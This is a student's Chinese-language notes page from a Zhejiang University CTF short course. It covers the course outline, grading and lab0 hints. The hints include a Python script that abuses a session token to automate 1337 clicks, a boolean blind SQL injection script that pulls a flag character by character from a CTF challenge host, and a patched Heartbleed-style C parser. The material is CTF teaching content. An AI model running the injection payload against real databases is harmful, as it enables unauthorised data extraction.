                    <section class='print-page md-section' id='section-2-5-1' heading-number='2.5.1'>
                        <h1>CTF 竞赛<a class='headerlink' href='#section-2-5-1' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-ctf-ctf" heading-number="2.5.1.1"><h1 id="note-ctf-ctf-aaa">浙江大学AAA短学期课程<a class="headerlink" href="#note-ctf-ctf-aaa" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 320 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 117 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 3 分钟</p>
</div>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg></span><a href="https://github.com/kailqq/CTF">详细的lab与代码均会上传到仓库</a></p>
<h2 id="note-ctf-ctf-7-2-lec1">7-2 lec1<a class="headerlink" href="#note-ctf-ctf-7-2-lec1" title="Permanent link">&para;</a></h2>
<blockquote>
<p>授课：常瑞，王鹤翔(<strong>TonyCrane</strong>)</p>
</blockquote>
<h3 id="note-ctf-ctf-courese-website"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M64 32C64 14.3 49.7 0 32 0S0 14.3 0 32v448c0 17.7 14.3 32 32 32s32-14.3 32-32V352l64.3-16.1c41.1-10.3 84.6-5.5 122.5 13.4 44.2 22.1 95.5 24.8 141.7 7.4l34.7-13c12.5-4.7 20.8-16.6 20.8-30V66c0-23-24.2-38-44.8-27.7l-9.6 4.8c-46.3 23.2-100.8 23.2-147.1 0-35.1-17.6-75.4-22-113.5-12.5L64 48z"/></svg></span><a href="https://courses.zjusec.com">courese website</a><a class="headerlink" href="#note-ctf-ctf-courese-website" title="Permanent link">&para;</a></h3>
<h3 id="note-ctf-ctf-_1">课程介绍<a class="headerlink" href="#note-ctf-ctf-_1" title="Permanent link">&para;</a></h3>
<p>第一节课例行介绍课程内容，老师以及TA，CTF介绍:</p>
<ul>
<li>
<p>web</p>
</li>
<li>
<p>misc</p>
</li>
<li>
<p>crypto</p>
</li>
<li>
<p>pwn</p>
</li>
<li>
<p>reverse</p>
</li>
<li>
<p>著名CTF比赛介绍 </p>
</li>
</ul>
<div class="admonition note 分数组成">
<p class="admonition-title">Note</p>
<ul>
<li>基础模块 lab0+5个实验 <strong>55%</strong></li>
<li>考勤 <strong>%5</strong></li>
<li>五个专题 每次作业 <strong>20%</strong> ，自选2个或以上</li>
</ul>
</div>
<h3 id="note-ctf-ctf-ctf">如何学习CTF<a class="headerlink" href="#note-ctf-ctf-ctf" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><a href="https://ctf-wiki.org/">CTF-wiki</a></p>
</li>
<li>
<p><a href="https://hello-ctf.com">hello-CTF</a>  </p>
</li>
<li>
<p><a href="https://ctf.zjusec.com">zju校赛</a></p>
</li>
<li>
<p><a href="https://hack.lug.ustc.edu.cn">Hackergame</a></p>
</li>
</ul>
<h3 id="note-ctf-ctf-lab0">lab0<a class="headerlink" href="#note-ctf-ctf-lab0" title="Permanent link">&para;</a></h3>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M64 32C64 14.3 49.7 0 32 0S0 14.3 0 32v448c0 17.7 14.3 32 32 32s32-14.3 32-32V352l64.3-16.1c41.1-10.3 84.6-5.5 122.5 13.4 44.2 22.1 95.5 24.8 141.7 7.4l34.7-13c12.5-4.7 20.8-16.6 20.8-30V66c0-23-24.2-38-44.8-27.7l-9.6 4.8c-46.3 23.2-100.8 23.2-147.1 0-35.1-17.6-75.4-22-113.5-12.5L64 48z"/></svg></span><a href="https://courses.zjusec.com/intro/lab0/"><strong>lab0</strong></a>
作为课程第一个作业，需要全部做完</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>由于lab0报告中我已经写过一遍解释，不想再照搬上来力，所以只写个大概</p>
</div>
<h4 id="note-ctf-ctf-web">Web<a class="headerlink" href="#note-ctf-ctf-web" title="Permanent link">&para;</a></h4>
<h5 id="note-ctf-ctf-token">Token<a class="headerlink" href="#note-ctf-ctf-token" title="Permanent link">&para;</a></h5>
<p>背景：点击一个按钮1337次会得到Flag，但是鼠标靠近就会使得按钮消失，F12查看源代码也被禁止。</p>
<ul>
<li>
<p>view-source：
   <img alt="" src="../NOTE/CTF/img/view.png" /></p>
</li>
<li>
<p><code>curl</code>命令 
   <img alt="" src="../NOTE/CTF/img/curl%20.png" /></p>
</li>
</ul>
<p>需要以同一个用户来执行1337次点击</p>
<details class="hint">
<summary>Hint</summary>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ctf-ctf-__codelineno-0-1"></a><span class="kn">import</span> <span class="nn">requests</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ctf-ctf-__codelineno-0-2"></a>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ctf-ctf-__codelineno-0-3"></a><span class="kn">import</span> <span class="nn">re</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ctf-ctf-__codelineno-0-4"></a>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ctf-ctf-__codelineno-0-5"></a><span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ctf-ctf-__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ctf-ctf-__codelineno-0-7"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1337</span><span class="p">):</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ctf-ctf-__codelineno-0-8"></a>    <span class="n">res</span><span class="o">=</span><span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://pumpk1n.com/lab0.php&quot;</span><span class="p">)</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ctf-ctf-__codelineno-0-9"></a>    <span class="n">r</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;token=(.*)&#39;&quot;</span><span class="p">,</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ctf-ctf-__codelineno-0-10"></a>    <span class="n">flag</span><span class="o">=</span><span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://pumpk1n.com/flag.php?token=</span><span class="si">{</span><span class="n">r</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ctf-ctf-__codelineno-0-11"></a>    <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">1336</span><span class="p">):</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ctf-ctf-__codelineno-0-12"></a>      <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></code></pre></div>
</details>
<h5 id="note-ctf-ctf-_2">布尔盲注<a class="headerlink" href="#note-ctf-ctf-_2" title="Permanent link">&para;</a></h5>
<p>只有两种输入被允许，空格也不允许，1和2，但是会进行布尔运算，可以利用括号代替空格</p>
<details class="hint">
<summary>Hint</summary>
<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ctf-ctf-__codelineno-1-1"></a><span class="kn">import</span> <span class="nn">requests</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ctf-ctf-__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">string</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ctf-ctf-__codelineno-1-3"></a>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ctf-ctf-__codelineno-1-4"></a>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ctf-ctf-__codelineno-1-5"></a><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ctf-ctf-__codelineno-1-6"></a><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://040601e5-a92b-4bc9-8831-f9863d3d8381.node5.buuoj.cn:81/&#39;</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ctf-ctf-__codelineno-1-7"></a><span class="n">ascii_list</span><span class="o">=</span><span class="n">string</span><span class="o">.</span><span class="n">printable</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ctf-ctf-__codelineno-1-8"></a><span class="n">done</span><span class="o">=</span><span class="mi">0</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ctf-ctf-__codelineno-1-9"></a><span class="n">index</span><span class="o">=</span><span class="mi">0</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ctf-ctf-__codelineno-1-10"></a><span class="k">while</span> <span class="n">done</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ctf-ctf-__codelineno-1-11"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ascii_list</span><span class="p">:</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-ctf-ctf-__codelineno-1-12"></a>        <span class="nb">input</span><span class="o">=</span><span class="s1">&#39;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{0}</span><span class="s1">,1))=</span><span class="si">{1}</span><span class="s1">,1,2)&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#note-ctf-ctf-__codelineno-1-13"></a>        <span class="n">post_in</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span><span class="nb">input</span><span class="p">}</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#note-ctf-ctf-__codelineno-1-14"></a>        <span class="n">res</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_in</span><span class="p">)</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#note-ctf-ctf-__codelineno-1-15"></a>        <span class="k">if</span> <span class="s1">&#39;glzjin&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#note-ctf-ctf-__codelineno-1-16"></a>            <span class="n">flag</span><span class="o">+=</span><span class="n">i</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#note-ctf-ctf-__codelineno-1-17"></a>            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#note-ctf-ctf-__codelineno-1-18"></a>            <span class="n">index</span><span class="o">+=</span><span class="mi">1</span>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#note-ctf-ctf-__codelineno-1-19"></a>            <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="s1">&#39;}&#39;</span><span class="p">:</span>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#note-ctf-ctf-__codelineno-1-20"></a>                <span class="n">done</span><span class="o">=</span><span class="mi">1</span>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#note-ctf-ctf-__codelineno-1-21"></a>            <span class="k">break</span>
</span></code></pre></div>
</details>
<h4 id="note-ctf-ctf-pwn">Pwn<a class="headerlink" href="#note-ctf-ctf-pwn" title="Permanent link">&para;</a></h4>
<p>寻找可能发生的内存泄漏</p>
<details class="hint">
<summary>Hint</summary>
<div class="language-C highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-ctf-ctf-__codelineno-2-1"></a><span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-ctf-ctf-__codelineno-2-2"></a><span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-ctf-ctf-__codelineno-2-3"></a><span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-ctf-ctf-__codelineno-2-4"></a><span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-ctf-ctf-__codelineno-2-5"></a><span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdbool.h&gt;</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-ctf-ctf-__codelineno-2-6"></a>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-ctf-ctf-__codelineno-2-7"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-ctf-ctf-__codelineno-2-8"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-ctf-ctf-__codelineno-2-9"></a><span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#note-ctf-ctf-__codelineno-2-10"></a><span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">timestamp</span><span class="p">;</span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#note-ctf-ctf-__codelineno-2-11"></a><span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">index</span><span class="p">;</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#note-ctf-ctf-__codelineno-2-12"></a><span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">cred</span><span class="p">;</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#note-ctf-ctf-__codelineno-2-13"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">data</span><span class="p">[];</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#note-ctf-ctf-__codelineno-2-14"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#note-ctf-ctf-__codelineno-2-15"></a>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#note-ctf-ctf-__codelineno-2-16"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">get_heart_beat</span><span class="p">()</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#note-ctf-ctf-__codelineno-2-17"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#note-ctf-ctf-__codelineno-2-18"></a><span class="w">        </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#note-ctf-ctf-__codelineno-2-19"></a><span class="w">        </span><span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#note-ctf-ctf-__codelineno-2-20"></a>
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#note-ctf-ctf-__codelineno-2-21"></a><span class="w">        </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#note-ctf-ctf-__codelineno-2-22"></a>
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#note-ctf-ctf-__codelineno-2-23"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">)</span>
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#note-ctf-ctf-__codelineno-2-24"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#note-ctf-ctf-__codelineno-2-25"></a>
</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#note-ctf-ctf-__codelineno-2-26"></a><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">))</span><span class="n">fread</span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#note-ctf-ctf-__codelineno-2-27"></a><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#note-ctf-ctf-__codelineno-2-28"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid size</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#note-ctf-ctf-__codelineno-2-29"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#note-ctf-ctf-__codelineno-2-30"></a><span class="w">        </span><span class="p">}</span><span class="c1">//增加判断，防止 size 小于等于 sizeof(struct hbpkt) 时无符号数溢出</span>
</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#note-ctf-ctf-__codelineno-2-31"></a>
</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#note-ctf-ctf-__codelineno-2-32"></a><span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">real_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#note-ctf-ctf-__codelineno-2-33"></a>
</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#note-ctf-ctf-__codelineno-2-34"></a><span class="w">        </span><span class="k">struct</span><span class="w"> </span><span class="nc">hbpkt</span><span class="w"> </span><span class="o">*</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">real_size</span><span class="p">);</span>
</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#note-ctf-ctf-__codelineno-2-35"></a>
</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#note-ctf-ctf-__codelineno-2-36"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#note-ctf-ctf-__codelineno-2-37"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#note-ctf-ctf-__codelineno-2-38"></a>
</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#note-ctf-ctf-__codelineno-2-39"></a><span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">res</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">real_size</span><span class="p">);</span>
</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#note-ctf-ctf-__codelineno-2-40"></a>
</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41" href="#note-ctf-ctf-__codelineno-2-41"></a><span class="w">        </span><span class="n">res</span><span class="o">-&gt;</span><span class="n">index</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-2-42"><a id="__codelineno-2-42" name="__codelineno-2-42" href="#note-ctf-ctf-__codelineno-2-42"></a><span class="w">        </span><span class="n">res</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">real_size</span><span class="p">;</span><span class="c1">//更新size，防止溢出</span>
</span><span id="__span-2-43"><a id="__codelineno-2-43" name="__codelineno-2-43" href="#note-ctf-ctf-__codelineno-2-43"></a>
</span><span id="__span-2-44"><a id="__codelineno-2-44" name="__codelineno-2-44" href="#note-ctf-ctf-__codelineno-2-44"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">res</span><span class="p">;</span>
</span><span id="__span-2-45"><a id="__codelineno-2-45" name="__codelineno-2-45" href="#note-ctf-ctf-__codelineno-2-45"></a><span class="w">    </span><span class="p">}</span>
